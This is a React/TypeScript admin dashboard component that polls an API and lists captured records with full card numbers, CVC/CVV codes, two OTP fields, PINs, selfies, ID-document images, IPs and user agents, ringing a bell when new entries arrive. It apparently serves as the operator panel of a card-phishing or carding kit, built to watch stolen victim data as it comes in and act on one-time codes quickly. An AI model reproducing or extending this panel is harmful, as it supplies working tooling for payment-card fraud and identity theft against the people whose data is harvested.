import { ChangeEvent, useEffect, useMemo, useRef, useState } from "react";
import {
  Box,
  Button,
  Card,
  CardContent,
  MenuItem,
  Stack,
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableRow,
  TextField,
} from "@mui/material";
import { toast } from "react-toastify";
import { Icon } from "@iconify/react";
import { useNavigate } from "react-router";
import api from "../../utils/api";
import { getErrMsg } from "../../utils/functions";
import { INTERVAL_TIME, ROW_COUNT } from "../../utils/constants";
import { useAuth } from "../../contexts/AuthContext";
import { ICard } from "../../utils/interfaces";
import { MIcon } from "../../utils/mappers";
import Image from "./Image";

export default function Dashboard() {
  const navigate = useNavigate();
  const { authToken } = useAuth();

  const [currentPage, setCurrentPage] = useState<number>(1);
  const [maxPage, setMaxPage] = useState<number>(1);
  const [cards, setCards] = useState<Array<ICard>>([]);
  const [prevTotalAmount, setPrevTotalAmount] = useState<number>(0);
  const [nextTotalAmount, setNextTotalAmount] = useState<number>(0);

  const audioRef = useRef<HTMLAudioElement | null>(null);

  const pageNumbers = useMemo<Array<number>>(() => {
    const pages = [];

    for (let i = 1; i <= maxPage; i += 1) {
      pages.push(i);
    }

    return pages;
  }, [maxPage]);

  const getCardsByPage = (page: number) => {
    api
      .get(`/admin/card/get/${page}`)
      .then((res) => {
        const { data } = res;
        setCards(data.cards);
        setMaxPage(data.maxPage);
        setPrevTotalAmount(nextTotalAmount);
        setNextTotalAmount(data.totalAmount);
      })
      .catch((err) => {
        toast.error(getErrMsg(err));
        if (err.response?.status === 401) navigate("/login");
      });
  };

  const handlePage = (e: ChangeEvent<HTMLInputElement>) => {
    const page = Number(e.target.value);
    setCurrentPage(page);
  };

  const enableSound = () => {
    audioRef.current?.play();
  };

  useEffect(() => {
    if (authToken) {
      getCardsByPage(currentPage);
      const interval = setInterval(() => {
        getCardsByPage(currentPage);
      }, INTERVAL_TIME);
      return () => clearInterval(interval);
    }
  }, [currentPage]);

  useEffect(() => {
    if (nextTotalAmount !== prevTotalAmount) {
      enableSound();
    }
  }, [prevTotalAmount, nextTotalAmount]);

  return (
    <Stack mt={4} spacing={4} flexGrow={1}>
      <Stack direction="row" justifyContent="space-between">
        <Button
          variant="outlined"
          onClick={enableSound}
          startIcon={<Icon icon={MIcon.sound} />}
        >
          Enable Sound
        </Button>
        <TextField select onChange={handlePage} value={currentPage}>
          {pageNumbers.map((pageItem) => (
            <MenuItem key={pageItem} value={pageItem}>
              {pageItem}
            </MenuItem>
          ))}
        </TextField>
      </Stack>
      <Card>
        <CardContent>
          <Table>
            <TableHead>
              <TableRow>
                <TableCell sx={{ fontWeight: 700 }}>No</TableCell>
                <TableCell sx={{ fontWeight: 700 }}>Phone</TableCell>
                <TableCell sx={{ fontWeight: 700 }}>IP</TableCell>
                <TableCell sx={{ fontWeight: 700 }}>User Agent</TableCell>
                <TableCell sx={{ fontWeight: 700 }}>Email</TableCell>
                <TableCell sx={{ fontWeight: 700 }}>Card Number</TableCell>
                <TableCell sx={{ fontWeight: 700 }}>Exp</TableCell>
                <TableCell sx={{ fontWeight: 700 }}>CVC/CVV</TableCell>
                <TableCell sx={{ fontWeight: 700 }}>OTP1</TableCell>
                <TableCell sx={{ fontWeight: 700 }}>OTP2</TableCell>
                <TableCell sx={{ fontWeight: 700 }}>PIN</TableCell>
                <TableCell sx={{ fontWeight: 700 }}>Selfie</TableCell>
                <TableCell sx={{ fontWeight: 700 }}>ID (Front)</TableCell>
                <TableCell sx={{ fontWeight: 700 }}>ID (Back)</TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {cards.map((card, index) => (
                <TableRow key={card.id}>
                  <TableCell>
                    {index + 1 + (currentPage - 1) * ROW_COUNT}
                  </TableCell>
                  <TableCell>{card.phone}</TableCell>
                  <TableCell>{card.ip_address}</TableCell>
                  <TableCell>{card.user_agent}</TableCell>
                  <TableCell>{card.email}</TableCell>
                  <TableCell>{card.number.replace(/\s/g, '')}</TableCell>
                  <TableCell>{card.expiry}</TableCell>
                  <TableCell>{card.cvv}</TableCell>
                  <TableCell>{card.otp1}</TableCell>
                  <TableCell>{card.otp2}</TableCell>
                  <TableCell>{card.pin}</TableCell>
                  <TableCell>
                    <Image imgSrc={card.selfie_img} />
                  </TableCell>
                  <TableCell>
                    <Image imgSrc={card.id_front_img} />
                  </TableCell>
                  <TableCell>
                    <Image imgSrc={card.id_back_img} />
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </CardContent>
      </Card>

      <Box
        component="audio"
        src="/assets/audios/bell.mp3"
        sx={{ display: "none" }}
        ref={audioRef}
        preload="auto"
      />
    </Stack>
  );
}
